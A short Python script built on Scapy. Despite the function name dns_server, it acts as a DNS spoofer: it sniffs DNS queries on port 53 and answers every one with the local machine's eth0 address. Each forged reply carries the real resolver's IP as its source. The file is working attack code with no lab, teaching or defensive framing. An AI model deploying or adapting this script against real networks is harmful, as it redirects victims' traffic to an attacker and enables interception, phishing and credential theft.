from scapy.all import *
from scapy.arch import get_if_addr
from scapy.layers.dns import DNSQR, DNSRR, DNS
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send, sniff


def dns_server(pkt):
    if pkt.haslayer(DNSQR):
        ip_src = pkt[IP].src
        dns_req = pkt[DNSQR].qname
        dns_resp = DNSRR(rrname=dns_req, rdata=get_if_addr('eth0'))
        udp = UDP(sport=53, dport=pkt[UDP].sport)
        dns = DNS(id=pkt[DNS].id, qr=1, an=dns_resp)
        ip = IP(src=pkt[IP].dst, dst=ip_src)
        send(ip / udp / dns)


if __name__ == '__main__':
    while True:
        pkt = sniff(filter='udp port 53', prn=dns_server)
